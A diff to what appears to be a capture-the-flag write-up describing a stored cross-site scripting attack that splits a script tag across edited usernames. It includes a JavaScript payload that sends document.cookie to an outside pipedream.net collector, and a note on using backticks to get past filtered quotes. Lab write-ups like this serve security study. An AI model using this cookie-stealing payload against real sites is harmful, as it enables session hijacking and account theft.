@@ -4,11 +4,11 @@ First, Register and login
 
 Edit username: **\*/\</script** and send cc notepad
 
-Edit username: **\<script>/\* **
+Edit username: **\<script>/\***&#x20;
 
 Host a sever pipedream and send request
 
-Note:** ' , "** filted so we use \`
+Note: **' , "** filted so we use \`
 
 ```javascript
 payload = */fetch(`https://enz92o3d70fhjpm.m.pipedream.net?c=`+document.cookie)/*
